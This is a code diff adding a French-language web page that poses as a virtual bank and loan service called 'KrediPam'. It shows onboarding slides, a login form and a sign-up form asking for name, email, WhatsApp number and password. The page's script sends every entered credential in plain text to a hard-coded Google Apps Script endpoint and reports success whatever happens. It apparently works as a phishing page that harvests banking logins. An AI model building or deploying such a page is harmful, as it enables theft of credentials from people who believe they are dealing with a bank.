@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>KrediPam - Bank Vityèl</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  <style>
+    .page { display: none; opacity: 0; transition: all 0.4s ease-in-out; }
+    .active { display: flex; opacity: 1; }
+    .btn-pro { 
+      @apply w-full bg-blue-600 text-white font-bold shadow-lg active:scale-95 transition-all flex items-center justify-center gap-3;
+      border-radius: 2rem; padding: 1.2rem; font-size: 1.1rem;
+    }
+    .input-pro { @apply w-full p-4 rounded-2xl bg-slate-100 border-2 border-transparent focus:border-blue-600 outline-none transition-all; }
+    .slide { display: none; }
+    .slide.active-slide { display: block; animation: fadeIn 0.5s; }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    .spinner { border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; width: 22px; height: 22px; animation: spin 1s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+  </style>
+</head>
+<body class="bg-slate-50 font-sans text-slate-900">
+
+  <div id="splash" class="page active fixed inset-0 bg-[#020617] z-[1000] flex flex-col items-center justify-center text-center">
+    <div class="w-24 h-24 bg-blue-600 rounded-[2.5rem] flex items-center justify-center shadow-2xl animate-pulse">
+      <i class="fas fa-shield-halved text-5xl text-white"></i>
+    </div>
+    <h1 class="text-4xl font-black text-white mt-6 tracking-tighter italic">KrediPam</h1>
+    <p class="text-blue-400 mt-2 font-medium tracking-widest uppercase text-xs">Sécurité Bancaire</p>
+  </div>
+
+  <div id="onboarding" class="page min-h-screen flex-col p-8 justify-between bg-white">
+    <div class="mt-12">
+      <div id="slide1" class="slide active-slide text-center">
+        <div class="w-20 h-20 bg-blue-50 text-blue-600 rounded-full flex items-center justify-center mx-auto mb-8 text-4xl shadow-inner"><i class="fas fa-hand-holding-usd"></i></div>
+        <h2 class="text-3xl font-black text-slate-900 leading-tight">Prêts Instantanés</h2>
+        <p class="text-slate-500 mt-4 text-lg font-medium">Obtenez un financement rapide en moins de 5 minutes.</p>
+      </div>
+      <div id="slide2" class="slide text-center">
+        <div class="w-20 h-20 bg-indigo-50 text-indigo-600 rounded-full flex items-center justify-center mx-auto mb-8 text-4xl shadow-inner"><i class="fas fa-credit-card"></i></div>
+        <h2 class="text-3xl font-black text-slate-900 leading-tight">Cartes Virtuelles</h2>
+        <p class="text-slate-500 mt-4 text-lg font-medium">Générez des cartes VISA/Mastercard sécurisées.</p>
+      </div>
+      <div id="slide3" class="slide text-center">
+        <div class="w-20 h-20 bg-green-50 text-green-600 rounded-full flex items-center justify-center mx-auto mb-8 text-4xl shadow-inner"><i class="fas fa-lock"></i></div>
+        <h2 class="text-3xl font-black text-slate-900 leading-tight">Sécurité Maximale</h2>
+        <p class="text-slate-500 mt-4 text-lg font-medium">Vos données sont cryptées avec soin.</p>
+      </div>
+    </div>
+    <div class="flex flex-col gap-4 mb-6">
+       <button id="btnNext" onclick="moveSlide()" class="btn-pro">Continuer</button>
+    </div>
+  </div>
+
+  <div id="connexion" class="page min-h-screen flex-col p-6 items-center justify-center">
+    <div class="w-full max-w-md bg-white p-8 rounded-[2.5rem] shadow-2xl">
+      <h2 class="text-3xl font-black mb-2 text-slate-900">Connexion</h2>
+      <div class="space-y-4">
+        <input type="email" id="emailConnexion" class="input-pro" placeholder="Email">
+        <input type="password" id="passConnexion" class="input-pro" placeholder="Mot de passe">
+        <button id="btn-login" onclick="connexion()" class="btn-pro">
+          <span>Se connecter</span>
+          <div id="load-login" class="spinner hidden"></div>
+        </button>
+        <div id="msg-login" class="text-center text-xs font-bold p-4 rounded-2xl hidden"></div>
+        <p class="text-center text-sm">Pas de compte ? <button onclick="showPage('inscription')" class="text-blue-600 font-bold underline">Créer un compte</button></p>
+      </div>
+    </div>
+  </div>
+
+  <div id="inscription" class="page min-h-screen flex-col p-6 items-center justify-center">
+    <div class="w-full max-w-md bg-white p-8 rounded-[2.5rem] shadow-2xl">
+      <h2 class="text-2xl font-black mb-6">Nouvel Utilisateur</h2>
+      <div class="space-y-4">
+        <input type="text" id="nomInscription" class="input-pro" placeholder="Nom complet">
+        <input type="email" id="emailInscription" class="input-pro" placeholder="Email">
+        <input type="tel" id="whatsappInscription" class="input-pro" placeholder="WhatsApp (+509)">
+        <input type="password" id="passInscription" class="input-pro" placeholder="Mot de passe">
+        <button id="btn-reg" onclick="verifierEtEnvoyerCode()" class="btn-pro bg-slate-900">
+           <span id="txt-reg">Suivant</span>
+           <div id="load-reg" class="spinner hidden"></div>
+        </button>
+        <div id="msg-reg" class="text-center text-xs font-bold p-4 rounded-2xl hidden"></div>
+        <div id="codeSection" class="hidden mt-6 bg-blue-50 p-6 rounded-3xl border border-blue-100">
+           <input type="number" id="codeVerification" class="input-pro text-center text-2xl" placeholder="000000">
+           <button onclick="inscription()" class="btn-pro mt-4 bg-green-600">Confirmer</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // TON LIEN DEPLOYÉ
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzVN4HhhNbrEeTuOPg5-NZs_vF2EZoI5o-5RbU3eIigmiqbr8iVeh9crr3Ix0Ri8dJ7rg/exec";
+    
+    let currentStep = 1;
+
+    function moveSlide() {
+      if(currentStep < 3) {
+        document.getElementById(`slide${currentStep}`).classList.remove('active-slide');
+        currentStep++;
+        document.getElementById(`slide${currentStep}`).classList.add('active-slide');
+        if(currentStep === 3) document.getElementById('btnNext').textContent = "Commencer";
+      } else { showPage('connexion'); }
+    }
+
+    function showPage(pageId) {
+      document.querySelectorAll('.page').forEach(p => { p.classList.remove('active'); p.style.display = 'none'; });
+      const target = document.getElementById(pageId);
+      target.style.display = 'flex';
+      setTimeout(() => target.classList.add('active'), 10);
+    }
+
+    window.onload = () => { setTimeout(() => { showPage('onboarding'); }, 3000); };
+
+    function showStatus(elementId, message, isError) {
+      const el = document.getElementById(elementId);
+      el.textContent = message;
+      el.className = `text-center text-xs font-bold p-4 rounded-2xl mt-4 ${isError ? 'bg-red-50 text-red-600' : 'bg-green-50 text-green-600'}`;
+      el.classList.remove('hidden');
+    }
+
+    async function releServe(done) {
+      try {
+        await fetch(SCRIPT_URL, {
+          method: 'POST',
+          mode: 'no-cors',
+          body: JSON.stringify(done)
+        });
+        return { success: true };
+      } catch (e) {
+        return { success: false };
+      }
+    }
+
+    async function connexion() {
+      const email = document.getElementById('emailConnexion').value.trim();
+      const pass = document.getElementById('passConnexion').value;
+      if(!email || !pass) return;
+      document.getElementById('load-login').classList.remove('hidden');
+      await releServe({ action: "connexion", email, pass });
+      showStatus('msg-login', "Requête envoyée. Vérifiez vos accès.", false);
+      document.getElementById('load-login').classList.add('hidden');
+    }
+
+    async function verifierEtEnvoyerCode() {
+      const email = document.getElementById('emailInscription').value.trim();
+      if(!email) return;
+      document.getElementById('load-reg').classList.remove('hidden');
+      await releServe({ action: "verifierEmail", email });
+      showStatus('msg-reg', "Code envoyé par email.", false);
+      document.getElementById('codeSection').classList.remove('hidden');
+      document.getElementById('load-reg').classList.add('hidden');
+    }
+
+    async function inscription() {
+      const done = {
+        action: "inscription",
+        nom: document.getElementById('nomInscription').value,
+        email: document.getElementById('emailInscription').value,
+        whatsapp: document.getElementById('whatsappInscription').value,
+        pass: document.getElementById('passInscription').value,
+        code: document.getElementById('codeVerification').value
+      };
+      await releServe(done);
+      showStatus('msg-reg', "Inscription soumise. Redirection...", false);
+      setTimeout(() => showPage('connexion'), 2500);
+    }
+  </script>
+</body>
+</html>
